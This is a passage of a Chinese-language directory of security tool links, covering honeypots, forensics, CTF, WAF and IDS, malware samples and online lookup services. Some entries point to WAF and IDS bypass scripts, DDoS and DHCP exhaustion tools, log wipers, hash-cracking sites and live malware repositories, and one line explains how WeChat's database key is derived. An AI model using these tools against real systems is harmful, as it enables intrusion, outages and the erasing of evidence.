MITM，打造可记录图像和按键的 RDP 蜜罐（<a href="https://github.com/gosecure/pyrdp%EF%BC%89">https://github.com/gosecure/pyrdp）</a></p></li></ul><h2 id="摄像头蜜罐"><a href="#摄像头蜜罐" class="headerlink" title="摄像头蜜罐#"></a><strong>摄像头蜜罐</strong>#</h2><ul><li><p><a href="https://github.com/alexbredo/honeypot-camera">https://github.com/alexbredo/honeypot-camera</a> py，摄像头蜜罐。tornado 模拟 WEB 服务，图片代替视频，可以考虑后期多加点图片和按钮</p></li><li><p><a href="https://github.com/EasyDarwin/EasyIPCamera">https://github.com/EasyDarwin/EasyIPCamera</a> C，RTSP 服务器组件用以构建摄像头蜜罐</p></li></ul><h2 id="工控蜜罐"><a href="#工控蜜罐" class="headerlink" title="工控蜜罐#"></a><strong>工控蜜罐</strong>#</h2><ul><li><p><a href="https://github.com/sjhilt/GasPot">https://github.com/sjhilt/GasPot</a> 模拟油电燃气工控系统</p></li><li><p><a href="https://github.com/djformby/GRFICS">https://github.com/djformby/GRFICS</a> IoT 工业仿真系统模拟框架，采用 MODBUS 协议对 PLC 虚拟机监视和控制</p></li><li><p><a href="https://github.com/RabitW/IoTSecurityNAT">https://github.com/RabitW/IoTSecurityNAT</a> IoT 测试系统，方便快速接入各种设备，进行安全测试</p></li><li><p><a href="https://github.com/mushorg/conpot">https://github.com/mushorg/conpot</a> 针对 ICS/SCADA 的低交互工控蜜罐，模拟 Modbus 和 S7comm</p></li></ul><h2 id="逆向相关"><a href="#逆向相关" class="headerlink" title="逆向相关#"></a><strong>逆向相关</strong>#</h2><ul><li><p><a href="https://www.peerlyst.com/posts/resource-learning-how-to-reverse-malware-a-guide">https://www.peerlyst.com/posts/resource-learning-how-to-reverse-malware-a-guide</a> 恶意软件逆向指南和工具的集合</p></li><li><p><a href="https://github.com/ReFirmLabs/binwalk">https://github.com/ReFirmLabs/binwalk</a> 二进制 pwn 文件自动化逆向，拥有多种插件</p></li><li><p><a href="https://github.com/angr/angr">https://github.com/angr/angr</a> 一个具有动态符号执行和静态分析的二进制分析工具</p></li><li><p><a href="https://github.com/endgameinc/xori">https://github.com/endgameinc/xori</a> 自定义反汇编框架</p></li><li><p><a href="https://down.52pojie.cn/">https://down.52pojie.cn/</a> 吾爱破解爱盘工具包</p></li><li><p><a href="https://github.com/blacknbunny/peanalyzer32">https://github.com/blacknbunny/peanalyzer32</a> PE 文件分析和反汇编工具</p></li><li><p><a href="https://github.com/DominicBreuker/pspy">https://github.com/DominicBreuker/pspy</a> 不用 root 权限就可以监控进程运行</p></li></ul><h2 id="CTF-相关"><a href="#CTF-相关" class="headerlink" title="CTF 相关#"></a><strong>CTF 相关</strong>#</h2><ul><li><p><a href="https://ctf-wiki.github.io/ctf-wiki/">https://ctf-wiki.github.io/ctf-wiki/</a> CTFwiki，Misc/Crypto/Web/Assembly/Executable/Reverse/Pwn/Android/ICS</p></li><li><p><a href="https://github.com/adon90/pentest_compilation">https://github.com/adon90/pentest_compilation</a> ctf 比赛与 OSCP 考试中常见的知识点和命令</p></li><li><p><a href="https://github.com/gabemarshall/microctfs">https://github.com/gabemarshall/microctfs</a> 小型 ctf 镜像 docker</p></li><li><p><a href="https://github.com/giantbranch/pwn_deploy_chroot">https://github.com/giantbranch/pwn_deploy_chroot</a> 部署多个 pwn 题到一个 docker 容器中</p></li><li><p><a href="https://github.com/facebook/fbctf">https://github.com/facebook/fbctf</a> CTF 比赛框架</p></li><li><p><a href="https://github.com/0Chencc/CTFCrackTools">https://github.com/0Chencc/CTFCrackTools</a> CTF 工具集成包</p></li><li><p><a href="https://github.com/guyoung/CaptfEncoder">https://github.com/guyoung/CaptfEncoder</a> CTF 密码编码全家桶，还有小程序版本</p></li><li><p><a href="https://github.com/Gallopsled/pwntools">https://github.com/Gallopsled/pwntools</a> pwn 类型，二进制利用框架</p></li><li><p><a href="https://github.com/ChrisTheCoolHut/Zeratool">https://github.com/ChrisTheCoolHut/Zeratool</a> pwn 类型，二进制利用框架</p></li><li><p><a href="https://github.com/ChrisTheCoolHut/Rocket-Shot">https://github.com/ChrisTheCoolHut/Rocket-Shot</a> pwn，自动攻击脚本</p></li><li><p><a href="https://0xrick.github.io/lists/stego/">https://0xrick.github.io/lists/stego/</a> 隐写术工具集，Steganography - A list of useful tools and resources</p></li><li><p><a href="https://github.com/DominicBreuker/stego-toolkit">https://github.com/DominicBreuker/stego-toolkit</a> 隐写工具包</p></li><li><p><a href="https://github.com/bugsafe/WeReport">https://github.com/bugsafe/WeReport</a> WeReport 报告助手</p></li><li><p><a href="https://github.com/PELock/CrackMeZ3S-CTF-CrackMe-Tutorial">https://github.com/PELock/CrackMeZ3S-CTF-CrackMe-Tutorial</a> 为 CTF 比赛编写 CrackMe 软件</p></li></ul><h2 id="计算机与移动设备取证调查"><a href="#计算机与移动设备取证调查" class="headerlink" title="计算机与移动设备取证调查#"></a><strong>计算机与移动设备取证调查</strong>#</h2><ul><li><p><a href="https://www.freebuf.com/articles/rookie/195107.html">https://www.freebuf.com/articles/rookie/195107.html</a> 记一次微信数据库解密过程。微信的加密数据库的解密密码是由“设备的 IMEI(MEID)+用户的 uin，进行 MD5，然后取其前 7 位小写字母”构成的</p></li><li><p><a href="https://www.audacityteam.org/">https://www.audacityteam.org/</a> 音频文件和波形图处理工具</p></li><li><p><a href="http://www.sweetscape.com/010editor/">http://www.sweetscape.com/010editor/</a> 识别不同文件格式（模板）的 16 进制编辑器，具有文件修复功能</p></li><li><p><a href="http://www.magicexif.com/">http://www.magicexif.com/</a> 将照片图像中的 exif 信息数据化</p></li><li><p><a href="http://mediaarea.net/MediaInfo">http://mediaarea.net/MediaInfo</a> 类似 exiftool 来查看内容区域和元数据信息</p></li><li><p><a href="https://www.sno.phy.queensu.ca/~phil/exiftool/">https://www.sno.phy.queensu.ca/~phil/exiftool/</a> 检查图像文件的 exif 元数据</p></li><li><p><a href="https://www.gimp.org/">https://www.gimp.org/</a> Gimp 提供了转换各类图像文件可视化数据的功能，还可以用于确认文件是否是一个图像文件</p></li><li><p><a href="https://github.com/volatilityfoundation/volatility">https://github.com/volatilityfoundation/volatility</a> windows 内存取证分析</p></li><li><p><a href="https://github.com/gleeda/memtriage">https://github.com/gleeda/memtriage</a> Windows 内存取证分析</p></li><li><p><a href="https://github.com/SekoiaLab/Fastir_Collector">https://github.com/SekoiaLab/Fastir_Collector</a> Windows 取证/信息收集，不限于内存，注册表，文件信息等</p></li><li><p><a href="https://github.com/Viralmaniar/Remote-Desktop-Caching-">https://github.com/Viralmaniar/Remote-Desktop-Caching-</a> RDP 信息复原，png 图片格式</p></li><li><p><a href="https://github.com/comaeio/LiveCloudKd">https://github.com/comaeio/LiveCloudKd</a> C，针对 Hyper-V 的内存取证</p></li><li><p><a href="https://github.com/sevagas/swap_digger">https://github.com/sevagas/swap_digger</a> 针对 Linux swap 进行取证分析的工具</p></li><li><p><a href="http://extundelete.sourceforge.net/">http://extundelete.sourceforge.net/</a> linux 下的文件恢复</p></li><li><p><a href="https://github.com/viaforensics/android-forensics">https://github.com/viaforensics/android-forensics</a> 安卓取证 App 和框架，可以对安卓设备内各种信息进行提取</p></li><li><p><a href="https://github.com/davidmcgrew/joy">https://github.com/davidmcgrew/joy</a> 用来捕获和分析内外网流量数据的包，主要用于进行网络调查、安全监控和取证</p></li><li><p><a href="https://github.com/USArmyResearchLab/Dshell">https://github.com/USArmyResearchLab/Dshell</a> 可扩展的网络取证分析框架，支持快速开发插件与解析网络数据包捕获</p></li><li><p><a href="http://qpdf.sourceforge.net/">http://qpdf.sourceforge.net/</a> 查看 pdf 文件并整理提取信息</p></li><li><p><a href="http://zipinfo.com/">http://zipinfo.com/</a> 在无需提取的情况下列出了 zip 文件的内容信息</p></li><li><p><a href="http://f00l.de/pcapfix/">http://f00l.de/pcapfix/</a> pcap 文件修复</p></li><li><p><a href="https://www.cgsecurity.org/wiki/TestDisk">https://www.cgsecurity.org/wiki/TestDisk</a> 磁盘分区修复</p></li><li><p><a href="https://github.com/decalage2/oletools">https://github.com/decalage2/oletools</a> py，用于分析 MS OLE2 文件（结构化存储，复合文件二进制格式）和 MS Office 文档</p></li><li><p><a href="https://www.xplico.org/download">https://www.xplico.org/download</a> 内存取证</p></li><li><p><a href="https://github.com/google/bochspwn-reloaded">https://github.com/google/bochspwn-reloaded</a> Bochspwn Reloaded（内核信息泄漏检测）工具</p></li><li><p><a href="https://github.com/abrignoni/DFIR-SQL-Query-Repo">https://github.com/abrignoni/DFIR-SQL-Query-Repo</a> 收集用于数据取证的 SQL 查询模板</p></li><li><p><a href="https://www.freebuf.com/news/193684.html">https://www.freebuf.com/news/193684.html</a> iOS 取证技巧：在无损的情况下完整导出 SQLite 数据库</p></li></ul><h2 id="移动安全"><a href="#移动安全" class="headerlink" title="移动安全#"></a><strong>移动安全</strong>#</h2><ul><li><p><a href="https://github.com/Brucetg/App_Security">https://github.com/Brucetg/App_Security</a> App 安全学习资源</p></li><li><p><a href="https://github.com/rovo89/Xposed">https://github.com/rovo89/Xposed</a> 随心所欲修改安卓手机系统</p></li><li><p><a href="https://github.com/android-hacker/VirtualXposed">https://github.com/android-hacker/VirtualXposed</a> 基于 VirtualApp 和 epic 在非 ROOT 环境下运行 Xposed 模块的实现</p></li><li><p><a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF">https://github.com/MobSF/Mobile-Security-Framework-MobSF</a> 移动安全审计框架。android、ios、win</p></li><li><p><a href="https://github.com/WooyunDota/DroidSSLUnpinning">https://github.com/WooyunDota/DroidSSLUnpinning</a> 安卓证书锁定解除的工具</p></li><li><p><a href="https://github.com/nccgroup/house">https://github.com/nccgroup/house</a> 运行时手机 App 分析工具包, 带 Web GUI</p></li><li><p><a href="https://github.com/UltimateHackers/Diggy">https://github.com/UltimateHackers/Diggy</a> 从 Apk 文件中提取 URLs 的工具</p></li><li><p><a href="https://github.com/nettitude/scrounger">https://github.com/nettitude/scrounger</a> iOS 和 Android 移动应用程序渗透测试框架</p></li><li><p><a href="https://github.com/XekriCorp/LeakVM">https://github.com/XekriCorp/LeakVM</a> 安卓应用安全测试框架</p></li><li><p><a href="https://github.com/zsdlove/ApkVulCheck">https://github.com/zsdlove/ApkVulCheck</a> 安卓漏洞扫描工具</p></li><li><p><a href="https://github.com/samyk/frisky">https://github.com/samyk/frisky</a> 针对 ios/macOS 应用的嗅探/修改/逆向/注入等工具</p></li><li><p><a href="https://github.com/GeoSn0w/OsirisJailbreak12">https://github.com/GeoSn0w/OsirisJailbreak12</a> IOS12 不完全越狱</p></li><li><p><a href="https://github.com/chaitin/passionfruit">https://github.com/chaitin/passionfruit</a> iOS 应用逆向与分析工具，可以大大加速 iOS 应用安全分析过程</p></li></ul><h2 id="防火墙规则、Waf、CDN-相关"><a href="#防火墙规则、Waf、CDN-相关" class="headerlink" title="防火墙规则、Waf、CDN 相关#"></a><strong>防火墙规则、Waf、CDN 相关</strong>#</h2><ul><li><p><a href="https://github.com/baidu/openrasp">https://github.com/baidu/openrasp</a> RASP,Runtime Application Self-Protection，实时应用自我保护，更智能，针对每个语言定制</p></li><li><p><a href="https://github.com/snort3/snort3">https://github.com/snort3/snort3</a> snort 算是最出名的开源 ids 入侵检测</p></li><li><p><a href="https://github.com/chaitin/yanshi">https://github.com/chaitin/yanshi</a> 长亭偃师（yanshi）,雷池（SafeLine）防火墙核心引擎使用到的代码生成工具</p></li><li><p><a href="https://github.com/SpiderLabs/ModSecurity">https://github.com/SpiderLabs/ModSecurity</a> C，跨平台 WAF engine for Apache, IIS and Nginx</p></li><li><p><a href="https://github.com/klaubert/waf-fle">https://github.com/klaubert/waf-fle</a> ModSecurity Web 控制台</p></li><li><p><a href="https://github.com/xsec-lab/x-waf">https://github.com/xsec-lab/x-waf</a> 适用于中小企业的云 waf</p></li><li><p><a href="https://github.com/jx-sec/jxwaf">https://github.com/jx-sec/jxwaf</a> 基于 openrestynginx+lua 开发，独创的业务逻辑防护引擎和机器学习引擎，解决传统 WAF 无法对业务安全进行防护的痛点</p></li><li><p><a href="https://github.com/loveshell/ngx_lua_waf">https://github.com/loveshell/ngx_lua_waf</a> 基于 lua-nginx-moduleopenresty 的 web 应用防火墙</p></li><li><p><a href="https://github.com/Janusec/janusec">https://github.com/Janusec/janusec</a> 基于 Golang 开发的应用安全网关，具备 WAF、CC 攻击防御、证书私钥加密、负载均衡、统一 Web 化管理等功能。</p></li><li><p><a href="https://github.com/SpiderLabs/owasp-modsecurity-crs">https://github.com/SpiderLabs/owasp-modsecurity-crs</a> a set of generic attack detection rules for use with ModSecurity or compatible web application firewalls</p></li><li><p><a href="https://github.com/kirillwow/ids_bypass">https://github.com/kirillwow/ids_bypass</a> IDS Bypass 脚本</p></li><li><p><a href="https://github.com/milo2012/ipv4bypass">https://github.com/milo2012/ipv4bypass</a> 利用 ipV6 地址绕过 waf</p></li><li><p><a href="https://github.com/3xp10it/bypass_waf">https://github.com/3xp10it/bypass_waf</a> 防火墙绕过脚本</p></li><li><p><a href="https://github.com/m0rtem/CloudFail">https://github.com/m0rtem/CloudFail</a> 针对 Cloudfail,查找位于 CDN 后面网站的真实 IP</p></li><li><p><a href="https://github.com/Nitr4x/whichCDN">https://github.com/Nitr4x/whichCDN</a> CDN 识别、检测</p></li><li><p><a href="https://github.com/3xp10it/xcdn">https://github.com/3xp10it/xcdn</a> 尝试找出 cdn 背后的真实 ip，3xp10it.github.io 博客</p></li></ul><h2 id="入侵检测"><a href="#入侵检测" class="headerlink" title="入侵检测#"></a><strong>入侵检测</strong>#</h2><ul><li><p><a href="https://github.com/Neo23x0/Loki">https://github.com/Neo23x0/Loki</a> 一款 APT 入侵痕迹扫描器</p></li><li><p><a href="https://github.com/ossec/ossec-hids">https://github.com/ossec/ossec-hids</a> 开源 hids 堡垒机</p></li><li><p><a href="https://github.com/grayddq/HIDS">https://github.com/grayddq/HIDS</a> hids 基于主机型入侵检测系统，一个人的安全部</p></li><li><p><a href="https://github.com/ysrc/yulong-hids">https://github.com/ysrc/yulong-hids</a> 驭龙 HIDS 是一款由 YSRC 开源的入侵检测系统</p></li><li><p><a href="https://github.com/DianrongSecurity/AgentSmith-HIDS">https://github.com/DianrongSecurity/AgentSmith-HIDS</a> 点融开源 HIDS，开源部分为主机情报收集工具</p></li><li><p><a href="https://github.com/Tencent/HaboMalHunter">https://github.com/Tencent/HaboMalHunter</a> 哈勃分析系统，linux 系统病毒分析及安全测试</p></li><li><p><a href="https://github.com/JPCERTCC/LogonTracer">https://github.com/JPCERTCC/LogonTracer</a> 根据 win 登陆记录日志来分析并用图形化展示恶意登陆行为</p></li><li><p><a href="https://github.com/anwi-wips/anwi">https://github.com/anwi-wips/anwi</a> 无线 IDS, 基于低成本的 Wi-Fi 模块(ESP8266)</p></li><li><p><a href="https://github.com/Security-Onion-Solutions/security-onion">https://github.com/Security-Onion-Solutions/security-onion</a> 基于 ubuntu 用于入侵检测，网络安全监控和日志管理，采用分布式架构</p></li><li><p><a href="https://github.com/jpcertcc/sysmonsearch">https://github.com/jpcertcc/sysmonsearch</a> 将 Sysmon 的日志结果可视化</p></li><li><p><a href="http://m.imooc.com/article/21236">http://m.imooc.com/article/21236</a> 快速自检电脑是否被黑客入侵过(Windows 版)</p></li><li><p><a href="http://www.freebuf.com/articles/system/157597.html">http://www.freebuf.com/articles/system/157597.html</a> 快速自检电脑是否被黑客入侵过（Linux 版）</p></li><li><p><a href="http://www.freebuf.com/rookie/179638.html">http://www.freebuf.com/rookie/179638.html</a> 服务器入侵溯源小技巧整理</p></li><li><p><a href="https://github.com/zhanghaoyil/Hawk-I">https://github.com/zhanghaoyil/Hawk-I</a> 基于无监督机器学习算法从 Web 日志中自动提取攻击 Payload</p></li></ul><h2 id="恶意文件测与样本分析"><a href="#恶意文件测与样本分析" class="headerlink" title="恶意文件测与样本分析#"></a><strong>恶意文件测与样本分析</strong>#</h2><ul><li><p><a href="https://github.com/open-power-workgroup/Hospital">https://github.com/open-power-workgroup/Hospital</a> 全国莆田系医院名单</p></li><li><p><a href="https://github.com/chenerlich/FCL">https://github.com/chenerlich/FCL</a> 恶意代码使用的命令行收集</p></li><li><p><a href="https://paper.seebug.org/421">https://paper.seebug.org/421</a> 常见软件合集与恶意软件分析</p></li><li><p><a href="https://github.com/sapphirex00/Threat-Hunting">https://github.com/sapphirex00/Threat-Hunting</a> apt 恶意软件样本</p></li><li><p><a href="https://www.malware-traffic-analysis.net/">https://www.malware-traffic-analysis.net/</a> 恶意软件样本</p></li><li><p><a href="http://dasmalwerk.eu/">http://dasmalwerk.eu/</a> 恶意软件样本</p></li><li><p><a href="https://github.com/ytisf/theZoo">https://github.com/ytisf/theZoo</a> 恶意软件样本</p></li><li><p><a href="https://github.com/mstfknn/malware-sample-library">https://github.com/mstfknn/malware-sample-library</a> 恶意软件样本</p></li><li><p><a href="http://99.248.235.4/Library/">http://99.248.235.4/Library/</a> 恶意软件样本库。ladder</p></li><li><p><a href="https://github.com/robbyFux/Ragpicker">https://github.com/robbyFux/Ragpicker</a> 恶意软件信息爬取汇总分析</p></li><li><p><a href="https://github.com/phage-nz/ph0neutria">https://github.com/phage-nz/ph0neutria</a> 恶意软件信息爬取汇总分析</p></li><li><p><a href="https://github.com/JR0driguezB/malware_configs">https://github.com/JR0driguezB/malware_configs</a> 常见恶意配置文件</p></li><li><p><a href="https://github.com/sfaci/masc">https://github.com/sfaci/masc</a> 扫描网站中的恶意软件, 以及其他一些网站维护功能</p></li><li><p><a href="https://github.com/Neo23x0/munin">https://github.com/Neo23x0/munin</a> 依据文件 Hash 从各种在线恶意软件扫描服务提取信息的工具</p></li><li><p><a href="https://github.com/1lastBr3ath/drmine">https://github.com/1lastBr3ath/drmine</a> 自动化检测网页是否包含挖矿脚本的工具</p></li><li><p><a href="https://github.com/KasperskyLab/klara">https://github.com/KasperskyLab/klara</a> 卡巴斯基开源基于 Yara 的分布式恶意软件扫描系统,</p></li><li><p><a href="https://github.com/botherder/kraken">https://github.com/botherder/kraken</a> go，实现的 Yara 恶意软件扫描器</p></li><li><p><a href="https://github.com/alexandreborges/malwoverview">https://github.com/alexandreborges/malwoverview</a> simple，将恶意文件进行快速分类</p></li><li><p><a href="https://github.com/joxeankoret/pigaios">https://github.com/joxeankoret/pigaios</a> 直接对比源代码与编译的二进制文件</p></li><li><p><a href="https://github.com/viper-framework">https://github.com/viper-framework</a> py2，二进制分析和管理框架，对恶意文件进行分析</p></li><li><p><a href="https://github.com/netxfly/sec_check">https://github.com/netxfly/sec_check</a> 通过信息采集（账户、连接、端口等）与 yara 扫描进行安全检测</p></li><li><p><a href="https://github.com/nao-sec/tknk_scanner">https://github.com/nao-sec/tknk_scanner</a> yara 引擎为基础的恶意软件识别框架</p></li><li><p><a href="https://github.com/felixweyne/ProcessSpawnControl">https://github.com/felixweyne/ProcessSpawnControl</a> powershell,对恶意程序进行检测与监控</p></li><li><p><a href="https://github.com/Aurore54F/JaSt">https://github.com/Aurore54F/JaSt</a> 使用语法检测恶意/混淆的 JS 文件，<a href="https://www.blackhoodie.re/assets/archive/JaSt_blackhoodie.pdf">https://www.blackhoodie.re/assets/archive/JaSt_blackhoodie.pdf</a></p></li><li><p><a href="http://edr.sangfor.com.cn/">http://edr.sangfor.com.cn/</a> win，Linux 下恶意软件、webshell 检测查杀工具</p></li><li><p><a href="http://www.clamav.net/downloads">http://www.clamav.net/downloads</a> 病毒查杀软件</p></li><li><p><a href="http://www.chkrootkit.org/">http://www.chkrootkit.org/</a> rootkit 检测工具</p></li><li><p><a href="http://rootkit.nl/projects/rootkit_hunter.html">http://rootkit.nl/projects/rootkit_hunter.html</a> rootkit 检测工具</p></li></ul><h2 id="恶意文件检测之-Webshell-查杀扫描"><a href="#恶意文件检测之-Webshell-查杀扫描" class="headerlink" title="恶意文件检测之 Webshell 查杀扫描#"></a><strong>恶意文件检测之 Webshell 查杀扫描</strong>#</h2><ul><li><p><a href="http://www.safedog.cn/">http://www.safedog.cn/</a> 安全狗 web 防火墙</p></li><li><p><a href="http://d99net.net/">http://d99net.net/</a> win，啊 D 出品 D 盾 _ 防火墙，包含 waf 与 webshel 检测功能</p></li><li><p><a href="https://github.com/he1m4n6a/findWebshell">https://github.com/he1m4n6a/findWebshell</a> py，webshell 检查工具，可后期添加后门指纹，很强大</p></li><li><p><a href="https://github.com/ym2011/ScanBackdoor">https://github.com/ym2011/ScanBackdoor</a> 一款简洁的 Webshell 扫描工具</p></li><li><p><a href="https://github.com/erevus-cn/scan_webshell">https://github.com/erevus-cn/scan_webshell</a> webshell 扫描工具</p></li><li><p><a href="https://github.com/yassineaddi/BackdoorMan">https://github.com/yassineaddi/BackdoorMan</a> 可对指定目录进行 php webshell 检测</p></li><li><p><a href="https://github.com/nbs-system/php-malware-finder">https://github.com/nbs-system/php-malware-finder</a> 一款高效率 PHP-webshell 扫描工具</p></li><li><p><a href="https://github.com/emposha/PHP-Shell-Detector">https://github.com/emposha/PHP-Shell-Detector</a> 测试效率高达 99%的 webshell 检测工具</p></li><li><p><a href="https://github.com/emposha/Shell-Detector">https://github.com/emposha/Shell-Detector</a> Webshell 扫描工具，支持 php/perl/asp/aspx webshell 扫描</p></li></ul><h2 id="压力测试与-DDOS-相关"><a href="#压力测试与-DDOS-相关" class="headerlink" title="压力测试与 DDOS 相关#"></a><strong>压力测试与 DDOS 相关</strong>#</h2><ul><li><p><a href="https://github.com/ywjt/Dshield">https://github.com/ywjt/Dshield</a> DDOS 防护</p></li><li><p><a href="https://github.com/NewEraCracker/LOIC/">https://github.com/NewEraCracker/LOIC/</a> 一个为 Windows 设计的网络压力测试工具现已支持 Mac OS——译者注</p></li><li><p><a href="https://github.com/649/Memcrashed-DDoS-Exploit">https://github.com/649/Memcrashed-DDoS-Exploit</a> 利用 Memcached 服务器的 DDoS 攻击工具, 向 Memcached 服务器发送伪造的 UDP 数据包使其向攻击目标回复大量数据包</p></li><li><p><a href="https://github.com/jseidl/GoldenEye">https://github.com/jseidl/GoldenEye</a> py，DOS 测试</p></li><li><p><a href="https://github.com/mschwager/dhcpwn">https://github.com/mschwager/dhcpwn</a> DHCP IP 资源耗尽攻击工具</p></li><li><p><a href="https://github.com/Microsoft/Ethr">https://github.com/Microsoft/Ethr</a> GO,跨平台,TCP, UDP, HTTP, HTTPS 压力测试工具</p></li></ul><h2 id="匿名信息保护洋葱路由-TorBrowser"><a href="#匿名信息保护洋葱路由-TorBrowser" class="headerlink" title="匿名信息保护洋葱路由 TorBrowser#"></a><strong>匿名信息保护洋葱路由 TorBrowser</strong>#</h2><ul><li><p><a href="https://github.com/leitbogioro/Fuck_Aliyun">https://github.com/leitbogioro/Fuck_Aliyun</a> 关闭阿里云监控服务</p></li><li><p><a href="https://github.com/Nummer/Destroy-Windows-10-Spying">https://github.com/Nummer/Destroy-Windows-10-Spying</a> DWS 关闭 windows 监控服务</p></li><li><p><a href="https://github.com/Rizer0/Log-killer">https://github.com/Rizer0/Log-killer</a> 日志清除，Windows/Linux 服务器中的所有</p></li><li><p><a href="https://github.com/360-A-Team/EventCleaner">https://github.com/360-A-Team/EventCleaner</a> 日志擦除工具</p></li><li><p><a href="https://github.com/s-rah/onionscan">https://github.com/s-rah/onionscan</a> darkweb 暗网爬虫</p></li><li><p><a href="https://github.com/globaleaks/Tor2web">https://github.com/globaleaks/Tor2web</a> darkweb 暗网代理服务器，将 onion 的服务变为普通的服务</p></li><li><p><a href="https://github.com/milesrichardson/docker-onion-nmap">https://github.com/milesrichardson/docker-onion-nmap</a> 使用 nmap 扫描 Tor 网络上隐藏的”onion”服务</p></li><li><p><a href="https://github.com/GouveaHeitor/nipe">https://github.com/GouveaHeitor/nipe</a> 一个使所有流量通过 Tor 网络发出的脚本</p></li><li><p><a href="https://github.com/trimstray/multitor">https://github.com/trimstray/multitor</a> 启用多个 tor 通道转发流量，并设置负载均衡</p></li></ul><h2 id="爬虫相关"><a href="#爬虫相关" class="headerlink" title="爬虫相关#"></a><strong>爬虫相关</strong>#</h2><ul><li><p><a href="https://github.com/alphardex/looter">https://github.com/alphardex/looter</a> 轻量型爬虫框架，类比 Scrapy</p></li><li><p><a href="https://github.com/luyishisi/Anti-Anti-Spider">https://github.com/luyishisi/Anti-Anti-Spider</a> 过反爬虫</p></li><li><p><a href="https://github.com/xchaoinfo/fuck-login">https://github.com/xchaoinfo/fuck-login</a> 模拟登录一些常见的网站</p></li><li><p><a href="https://github.com/Maicius/InterestingCrawler">https://github.com/Maicius/InterestingCrawler</a> 抓取 QQ 空间说说内容并进行分析</p></li><li><p><a href="https://github.com/xjr7670/QQzone_crawler">https://github.com/xjr7670/QQzone_crawler</a> QQ 空间动态爬虫，利用 cookie 登录获取所有可访问好友空间的动态保存到本地</p></li></ul><h2 id="在线自服务与工具"><a href="#在线自服务与工具" class="headerlink" title="在线自服务与工具#"></a><strong>在线自服务与工具</strong>#</h2><ul><li><p><a href="https://github.com/Kickball/awesome-selfhosted">https://github.com/Kickball/awesome-selfhosted</a> awesome 系列之自服务应用</p></li><li><p><a href="https://github.com/littlecodersh/itchat">https://github.com/littlecodersh/itchat</a> 微信个人号接口、微信机器人及命令行微信</p></li><li><p><a href="https://github.com/sym233/core-values-encoder">https://github.com/sym233/core-values-encoder</a> js,社会主义核心价值观加密，<a href="https://sym233.github.io/core-values-encoder/">https://sym233.github.io/core-values-encoder/</a></p></li><li><p><a href="https://github.com/valentinxxx/nginxconfig.io/">https://github.com/valentinxxx/nginxconfig.io/</a> 在线 nginx 配置文件生成，demo 网址 <a href="https://nginxconfig.io/">https://nginxconfig.io</a></p></li><li><p><a href="https://github.com/asciimoo/searx">https://github.com/asciimoo/searx</a> 搭建一个自己的搜索引擎,DEMO 网址 <a href="https://searx.me/">https://searx.me/</a></p></li><li><p><a href="http://sc.ftqq.com/3.version">http://sc.ftqq.com/3.version</a> server 酱微信通知</p></li><li><p><a href="https://osint.link/">https://osint.link</a> Open Source Intelligence (OSINT) Tools &amp; Resources</p></li><li><p><a href="https://www.wolframalpha.com/">https://www.wolframalpha.com</a> 根据问题直接给出答案的网站</p></li><li><p>shodan.io 互联网感知引擎</p></li><li><p>fofa.so 白帽汇 NOSEC</p></li><li><p><a href="https://www.oshadan.com/">https://www.oshadan.com</a> 傻蛋联网设备搜索 _ 湖南安数网络</p></li><li><p>zoomeye.org 知道创宇互联网感知引擎</p></li><li><p><a href="https://sms.cngrok.com/receiving-sms">https://sms.cngrok.com/receiving-sms</a> 收码接码</p></li><li><p><a href="https://www.pdflibr.com/">https://www.pdflibr.com/</a> 收码接码</p></li><li><p><a href="https://www.fakenamegenerator.com/">https://www.fakenamegenerator.com</a> 多国身份信息模拟器</p></li><li><p><a href="https://recruitin.net/">https://recruitin.net</a> Easily use Google to search profiles on LinkedIn</p></li><li><p><a href="https://www.truthfinder.com/">https://www.truthfinder.com</a> 美国公民信息查询</p></li><li><p><a href="https://verify-email.org/">https://verify-email.org</a> 邮件真实性验证</p></li><li><p><a href="https://safeweb.norton.com/">https://safeweb.norton.com</a> 诺顿网站安全检测</p></li><li><p><a href="http://www.vuln.cn/tools/ftp">http://www.vuln.cn/tools/ftp</a> 在线 FTP 登录</p></li><li><p><a href="http://www.link114.cn/title/">http://www.link114.cn/title/</a> 批量查询网站标题</p></li><li><p><a href="https://www.whatweb.net/">https://www.whatweb.net/</a> 在线 web 指纹识别</p></li><li><p><a href="https://hackertarget.com/ip-tools/">https://hackertarget.com/ip-tools/</a> 提供 api，ip 相关工具、在线扫描器</p></li><li><p><a href="http://www.webscan.cc/">http://www.webscan.cc/</a> 同 IP 网站查询,C 段查询,IP 反查域名,C 段旁注,旁注工具</p></li><li><p><a href="https://www.phpinfo.me/bing.php">https://www.phpinfo.me/bing.php</a> 在线旁站查询|C 段查询|必应接口 C 段查询</p></li><li><p><a href="https://www.phpinfo.me/domain/">https://www.phpinfo.me/domain/</a> 在线子域名爆破</p></li><li><p><a href="https://www.dnsdb.io/">https://www.dnsdb.io</a> DNS 查询,子域名查询,IP 查询,A 记录查询,域名解析,旁站查询</p></li><li><p><a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a> dns recon and research, find and lookup dns records</p></li><li><p><a href="http://ip.chaxun.la/">http://ip.chaxun.la/</a> ip 反查域名—查询啦</p></li><li><p><a href="https://habo.qq.com/">https://habo.qq.com</a> 在线恶意文件检测</p></li><li><p><a href="https://www.virustotal.com/">https://www.virustotal.com</a> 恶意软件检测</p></li><li><p><a href="http://r.virscan.org/">http://r.virscan.org/</a> 恶意软件检测</p></li><li><p><a href="https://www.appscan.io/">https://www.appscan.io</a> 移动软件在线检测</p></li><li><p><a href="https://www.nomoreransom.org/">https://www.nomoreransom.org</a> 常见勒索软件分析还原</p></li><li><p><a href="https://www.cmd5.com/">https://www.cmd5.com/</a> HASH 密码在线破解</p></li><li><p><a href="https://www.onlinehashcrack.com/">https://www.onlinehashcrack.com</a> 密码哈希在线破解，邮件通知</p></li></ul><h2 id="在线办公套件"><a href="#在线办公套件" class="headerlink" title="在线办公套件#"></a><strong>在线办公套件</strong>#</h2><ul><li><p><a href="https://sadd.io/">https://sadd.io/</a> 在线操作系统</p></li><li><p><a href="https://github.com/zyx0814/dzzoffice">https://github.com/zyx0814/dzzoffice</a> 在线办公套件,DEMO 网址 demo.dzzoffice.com</p></li><li><p><a href="https://github.com/RobbieHan/gistandard">https://github.com/RobbieHan/gistandard</a> py，基于 Django，OA 工单办公管理系统</p></li><li><p><a href="https://github.com/pavanw3b/sh00t">https://github.com/pavanw3b/sh00t</a> PY3,DJANGO，安全测试工单管理</p></li><li><p><a href="https://github.com/chaitin/strapdown-zeta">https://github.com/chaitin/strapdown-zeta</a> 基于 strapdown.js，长亭二次开发开源的 